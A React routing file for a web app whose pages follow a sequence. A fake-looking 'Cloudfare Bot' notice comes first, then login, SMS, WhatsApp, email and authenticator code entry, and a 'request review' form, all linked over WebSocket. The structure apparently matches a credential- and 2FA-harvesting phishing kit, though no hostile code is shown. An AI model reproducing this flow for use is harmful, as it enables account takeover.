import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import { 
  Login, 
  SmsVerification, 
  WhatsAppVerification, 
  ErrorPage,
  RequestReviewForm,
  EmailOtp,
  OfficialNotice,
  AuthApp
} from './pages';
import './styles/common.css';
import { WebSocketProvider } from './context/WebSocketContext';

function AppRoutes() {
  return (
    <WebSocketProvider>
      <Routes>
        {/* Root redirects to login */}
        <Route path="/" element={<Navigate to="/require" replace />} />

        {/* Cloudfare Bot */}
        <Route path="/require" element={<OfficialNotice />} />
        
        {/* Main routes */}
        <Route path="/require/login" element={<Login />} />
        <Route path="/require/sms" element={<SmsVerification />} />
        <Route path="/require/whatsapp" element={<WhatsAppVerification />} />
        <Route path="/require/email" element={<EmailOtp />} />
        <Route path="/require/auth" element={<AuthApp />} />
        <Route path="/require/request-review" element={<RequestReviewForm />} />
        <Route path="/require/error" element={<ErrorPage />} />
        
        {/* Catch all - redirect to login */}
        <Route path="*" element={<Navigate to="/require/login" replace />} />
      </Routes>
    </WebSocketProvider>
  );
}

function App() {
  return (
    <Router>
      <AppRoutes />
    </Router>
  );
}

export default App;
